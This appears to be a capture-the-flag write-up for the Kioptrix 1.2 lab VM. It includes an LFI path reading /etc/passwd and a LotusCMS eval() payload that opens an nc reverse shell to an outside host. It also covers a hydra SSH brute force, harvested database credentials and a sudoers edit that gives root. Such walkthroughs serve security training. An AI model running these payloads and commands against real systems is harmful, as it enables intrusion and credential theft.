#  Kioptrix: Level 1.2 (#3)

## Recon & Enummeration

Nmap shows us 
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
MAC Address: 08:00:27:AC:D2:A2 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On the blog we find a possible username `loneferret` at `/index.php?system=Blog&post=1281005380`. We also note a comment section


## Intitial Foothold

### LFI

`/index.php?system=../../../../../../../etc/passwd%00.`

2 users: 
- `loneferret` 
- `dreg`

### LotusCMS 3.0 eval() RCE

metasploit didn't work, manually:

```
IP=10.10.10.4
PORT=1234
target=http://10.10.10.7
curl $target/index.php --data "page=index%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%20$IP%20$PORT%27%29%7D%3B%23%22"
```

## Privilege Escalation

### Bruteforcing

First we start a bruteforce on SSH for the loneferret user:

```
 hydra -l loneferret -P /usr/share/wordlists/rockyou.txt 10.10.10.7 -t 4 ssh
```

resulting in:

`[22][ssh] host: 10.10.10.7   login: loneferret   password: starwars`

### MySql Password Hashes

Let's look for passwords in the web config:
```
www-data@Kioptrix3:/home/www/kioptrix3.com$ grep -R password ./ | grep mysql
```

We find the Database login creds:
```
$GLOBALS["gallarific_mysql_server"] = "localhost";
$GLOBALS["gallarific_mysql_database"] = "gallery";
$GLOBALS["gallarific_mysql_username"] = "root";
$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
```
in phpmyadmin we can find 2 hashes in the devaccounts table:
```
1 	dreg 	0d3eccfb887aabd50f243b3f155c0f85
2 	loneferret 	5badcaf789d3d1d09794d8f021f40f0e
```
The MD5 hashes are available on crackstation.net:
| Hash |	Type	| Result
| -- |---| ---|
0d3eccfb887aabd50f243b3f155c0f85|	md5|   Mast3r
5badcaf789d3d1d09794d8f021f40f0e|	md5|   starwars

### Modifying /etc/sudoers through ht


Modify `/etc/sudoers` via ht, and add the binary  `/bin/su` to loneferret's line
```
sudo -u root ht
sudo su
id
uid=0(root) gid=0(root) groups=0(root)
```





